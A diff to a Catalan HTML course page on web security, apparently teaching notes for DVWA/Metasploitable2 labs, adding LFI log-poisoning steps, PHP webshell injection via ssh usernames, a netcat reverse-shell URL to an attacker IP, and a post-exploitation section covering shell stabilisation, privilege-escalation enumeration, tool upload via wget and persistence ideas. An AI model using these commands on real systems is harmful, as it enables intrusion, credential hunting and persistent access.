@@ -25,9 +25,10 @@
   <div class="sidebar">
     <a href="#http">Protocol WEB</a>
     <a href="#https">Seguretat en Http</a>
-    <a href="#atacs">Atacs a http</a>
+    <!-- <a href="#atacs">Atacs a http</a>  -->
     <a href="#owasp">OWASP</a>
-    <a href="#vuln">Principals Vulnerabilitats</a>    
+    <a href="#vuln">Principals Vulnerabilitats</a>   
+    <a href="#postexpl">Post Exploitation</a>   
     <a href="#labs">Laboratoris</a>
 
 
@@ -124,11 +125,11 @@
         <li>Criptografia:  TLS , tunel</li>
         <li>PKI (Publik Key Infraestructure)</li>
       </ul>
-      <p>En açp es consegueix: Xifrar les comunicacions, certificar la identitat del emisor, i la integritat de les dades trameses</p>
+      <p>En açò es consegueix: Xifrar les comunicacions, certificar la identitat del emisor, i la integritat de les dades trameses</p>
        <h2>Xifrat</h2>
       <h4>Tecnologia de xifrat</h4>
       <img src="imgs/tls1.2.png" alt="tls1.2" width="40%" class="imatge-esquerra">
-      <img src="imgs/tls1.3.png" alt="tls1.3" width="50%" >
+      <img src="imgs/tls1.3.png" alt="tls1.3" width="50%" > 
       <p>TLS 1.3 és la darrera versió del protocol TLS (Transport Layer Security) i
          representa una millora significativa respecte a TLS 1.2, centrant-se principalment en la seguretat i la velocitat.</p>
         <ul>
@@ -223,6 +224,7 @@
          <img src="imgs/juiceshop.png" alt="juice" width="12%" class="imatge-dreta">   
         <p>Existeixen llocs on trovar maquines vulnerables, i algunes es poden instal·lar directament en kali linux</p>
         <p>Per començar, les més utilitzades son "dvwa" i "juice-shop"</p>
+        <h4>  ¡¡dvwa es troba dins de Metasploitable2 !!</h4>
         <li>apt install dvwa </li>
         <pre><code># dvwa-start 
 # dvwa-stop    </code></pre>
@@ -251,7 +253,7 @@
 
       <hr>  <h2>LFI , RFI</h2>
         <h3>LFI (Local File Inclusion)</h3>
-        <p>El LFI (Local File Inclusion) és una vulnerabilitat de seguretat en aplicacions web que permet a un atacant 
+        <p>El LFI (Local File Inclusion) és una <strong>vulnerabilitat</strong> de seguretat en aplicacions web que permet a un atacant 
           llegir, i de vegades executar, arxius des del servidor. L'atac es produeix quan una aplicació web inclou un 
           arxiu basat en l'entrada de l'usuari sense validar-lo o sanejar-lo correctament.</p>
          <h3>Llegir fitxers del servidor</h3> 
@@ -266,14 +268,11 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
 
         <p>==> En la màquina DVWA, es proposa la URL ..</p>
         <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
+
         <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
         <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
           visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
-         <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
-         <li>Segon. Escriure dins del fitxer</li>
-         <li>Tercer. Preparar nc a la escolta, en maquina atacant (preparació de reverse-shell)</li>
-         <li>Quart: Obrir url amb codi nc de connexió al que escolta en la maquina atacant</li>
-         <li>La pestanya del navegador es queda 'pensant' i ja està la reverse shell connectada</li>
+
          <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access</code> .  Este fitxer registra tots els accesos al servidor web.</p>
          <p>El valor <em>User-Agent</em> és el tipus de navegador que està accedint, i queda registrat.</p>
          <p>La informació de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
@@ -284,13 +283,22 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
          <p>En este cas, sols per provar, s'ha inserit una simple ordre que mostra informació del sistema, però de igual manera
           es podria inserir un sezill codi que execute una  <strong>shell inversa</strong>, obrint un terminal interactiu que 
           permetria executar comandos directament.    </p>
+          <ul>Passos a seguir:
+            <li>Primer. Tindre accés mitjantçant LFI a algun fitxer de <em>log</em></li> 
+            <li>Segon. Escriure dins del fitxer</li>
+            <li>Tercer. Preparar nc a la escolta, en maquina atacant (preparació de reverse-shell)</li>
+            <li>Quart: Obrir url amb codi nc de connexió al que escolta en la maquina atacant</li>
+            <li>La pestanya del navegador es queda 'pensant' i ja està la reverse shell connectada</li>
+          </ul>
           
           <h4>Altres fitxers interessants per fer log poisoning:    </h4>
           <ul>
             <li>/var/log/auth.log</li>
-            <code>ssh '&lt;?php system($_GET[cmd]);?>@ip_victima'</code>
-            <p>⚠️ El ssh s'executarà des d'una distribució kali o similar, perquè en una normal, no deixa, sanitiza la cadena i dona error !!</p>
-            <p>En kali, en una terminal, posem <code>nc -lnvp 444</code></p>
+            <code>ssh '&lt;?php system($_GET[cmd]);?>@ip_victima' <br></code> o <br>
+            <code>ssh '&lt;?php shell_exec($_GET[cmd]);?>@ip_victima'</code>
+            <p>⚠️ El ssh s'executarà des d'una distribució kali o similar, perquè en una normal, no deixa, previament a enviar, higienitza la cadena i dona error !!</p>
+            <p class="alert"> Si el codi inserit no es correcte, al carregar la pàgina, donarà error i es pedrà el fitxer com a vector d'atac</p>
+            <p>En kali, en una terminal, posem <code>nc -lnvp 444</code> (estem preparant la reverse shell)</p>
             <code>en barra de navegador......index.php?page=/var/log/auth.log&cmd=nc 10.0.2.15 4444 -e /bin/bash</code>
             <li>/var/log/vsftpd.log</li>
             <code>Accedir al servidor ftp, posant en el nom d'usuari el codi a inserir</code>
@@ -300,6 +308,31 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
             <li>/proc/self/fd</li>
           </ul>
           <p>Abans de fer el log poisoning, s'ha de comprovar si es disposa d'accés a algun d'estos fitxers.</p>
+          <h4>Estabilitzar shell</h4>
+          <p>És molt recomanable estabilitzar una shell inversa després d'obtenir-la amb nc (netcat), sobretot en un entorn de hacking ètic o pentesting controlat.
+             Una shell sense estabilitzar és limitada i pot comportar problemes pràctics durant l’execució de comandes.</p>
+          <ul>Les shells bàsiques obtingudes amb nc solen tenir aquests inconvenients
+            <li>No permeten usar tecles especials (com Ctrl+C, fletxes, Tab per autocompletar...)</li>
+            <li>No són PTY interactives, cosa que impedeix executar eines com ssh, sudo, nano, top, etc</li>
+            <li>Si la connexió es trenca, la sessió pot quedar corrupta.</li>
+            <li>Dificulten executar programes que requereixin TTY</li>
+          </ul>
+          <p>Estabilitzar la shell resol tots aquests problemes i et dóna una sessió molt més funcional.</p>
+          <ul>🛠️ Maneres de estabilitzar una shell
+            <li>Obtenir un PTY amb Python (la més popular)</li>
+            <li>Utilitzar script</li>
+            <li>Utilitzar rlwrap des del teu costat</li>
+            <li>Millorar la shell amb socat</li>
+          </ul>
+          <pre>Primer s'ha de comprovar si es disposa d'alguna d'estes eines
+which python3
+which socat
+which script
+Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna res
+          </pre>
+          <p class="alert"> En la màquina Metasploitable2, les tecles no van be, s'ha de posar un comando per aixó : 
+            <code>sudo loadkeys es</code>
+          </p>
 
           <h4>Wrappers en php</h4>
           <p>En principi per explotar LFI usarem</p>
@@ -323,11 +356,9 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
           <li>El atacant usa netcac per obrir un port amb un servidor local (de netcat)</li>
           <code>$ nc -lnvp 4444</code>
           <li>A més a més , l'atacant obri un server web simple per servir fitxers de comandos</li>
-          <pre><code>
-mkdir /tmp/files
+          <pre><code>mkdir /tmp/files
 cd /tmp/files
-python3 -m http.server 80 
-          </code></pre>
+python3 -m http.server 80             </code></pre>
           <li>Es posa un fitxer 'reverse.txt' amb</li>
           <pre><code>
 &lt;?php
@@ -620,12 +651,130 @@ en el navegador , posem la ip de la victima seguit del codi RFI
           <li>tècniques Out-of-Band</li>
         dig @IP_DNS_ATACANT 'whoami'.dominio.com &
 
+    
       </section>         
+
+      <section id="postexpl">
+        <h1>Post explotació</h1>
+
+      <h1>Què fer després d'obtindre una reverse shell (NC)</h1>
+
+      <p>Una <strong>reverse shell</strong> amb <em>nc</em> sol ser bàsica i limitada. Normalment els passos següents són:</p>
+
+      <h2>🔧 1. Estabilitzar la shell</h2>
+      <p>La shell de netcat sol ser molt incòmoda (sense autocompletat, sense ctrl-c, sense històric…). Es pot millorar així:</p>
+
+      <p><strong>Mètode Python</strong> (si està instal·lat):</p>
+      <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl + Z        # per a suspendre la shell
+stty raw -echo
+fg
+reset
+      </code></pre>
+
+      <h2>🔧 2. Comprovar usuari i privilegis</h2>
+      <pre><code>whoami
+id
+hostname
+uname -a
+      </code></pre>
+
+      <h2>🔍 3. Enumeració del sistema</h2>
+      <p><strong>Enumerar sistema operatiu</strong></p>
+      <pre><code>cat /etc/os-release
+      </code></pre>
+
+      <p><strong>Processos</strong></p>
+      <pre><code>ps aux
+      </code></pre>
+
+      <p><strong>Tasques programades</strong></p>
+      <pre><code>crontab -l
+ls -la /etc/cron.*
+      </code></pre>
+
+      <p><strong>Serveis en execució / ports interns</strong></p>
+      <pre><code>netstat -tulpn 2>/dev/null || ss -tulpn
+      </code></pre>
+
+      <h2>🔍 4. Enumeració de permisos i possibles vectors d'escalada (privilege escalation)</h2>
+
+      <p><strong>Buscar fitxers amb SUID</strong></p>
+      <pre><code>find / -perm -4000 -type f 2>/dev/null
+find / -user root -perm -u=s 2>/dev/null         </code></pre>
+
+      <p><strong>Fitxers amb permisos d'escriptura perillosos</strong></p>
+      <pre><code>find / -writable -type f 2>/dev/null         </code></pre>
+
+      <p><strong>Buscar contrasenyes en text pla</strong></p>
+      <pre><code>grep -Ri "password" /etc 2>/dev/null         </code></pre>
+
+      <p><strong>Enumerar sudoers</strong></p>
+      <pre><code>sudo -l         </code></pre>
+      <p>Si hi ha algun comando permés amb sudo, buscar en la pag. GTFOBins (linux) o LOLBAS (windows)   per vore com es pot explotar</p>
+
+      <h2>📤 5. Pujar eines al host compromés</h2>
+      <p>És habitual pujar:</p>
+      <ul>
+          <li>linpeas.sh → enumeració automàtica Linux</li>
+          <li>pspy → veure processos que executa root</li>
+          <li>netcat amb bind shell</li>
+          <li>chisel → túnels per a pivoting</li>
+          <li>mimikatz (si és Windows i està autoritzat)</li>
+      </ul>
+
+      <p><strong>Pujada ràpida amb servidor HTTP:</strong></p>
+
+      <p>En la teua màquina:</p>
+      <pre><code>python3 -m http.server 8080         </code></pre>
+
+      <p>En la màquina víctima:</p>
+      <pre><code>wget http://LA_TEUA_IP:8080/linpeas.sh -O /tmp/linpeas.sh
+      chmod +x /tmp/linpeas.sh         </code></pre>
+
+      <h2>🚀 6. Intentar escalada de privilegis</h2>
+      <p>Segons el que hages trobat:</p>
+      <ul>
+          <li>SUID mal configurats</li>
+          <li>Tasques cron explotables</li>
+          <li>Serveis locals vulnerables</li>
+          <li>Capacitats de Linux (capabilities)</li>
+      </ul>
+
+      <pre><code>getcap -r / 2>/dev/null         </code></pre>
+
+      <ul>
+          <li>Permisos sudo insegurs</li>
+      </ul>
+
+      <h2>🔐 7. Persistència (només si l’abast ho permet)</h2>
+      <p>Exemples (si està en el contracte):</p>
+      <ul>
+          <li>Afegir claus SSH</li>
+          <li>Crear usuari temporal</li>
+          <li>Cronjobs de connexió</li>
+          <li>Reverse shell permanent</li>
+      </ul>
+
+      <h2>📑 8. Neteja final (molt important)</h2>
+      <p>Dins d’un pentest ètic sempre s'ha de:</p>
+      <ul>
+          <li>Borrar scripts pujats</li>
+          <li>Eliminar usuaris creats</li>
+          <li>Llevar claus SSH</li>
+          <li>Restaurar permisos modificats</li>
+          <li>Revisar logs si el client ho sol·licita</li>
+      </ul>
+
+      </section>         
+        
+
       <section id="labs">
         <h1>Laboratoris</h1>
 
       </section>         
-     
+ 
       
 
     </main>
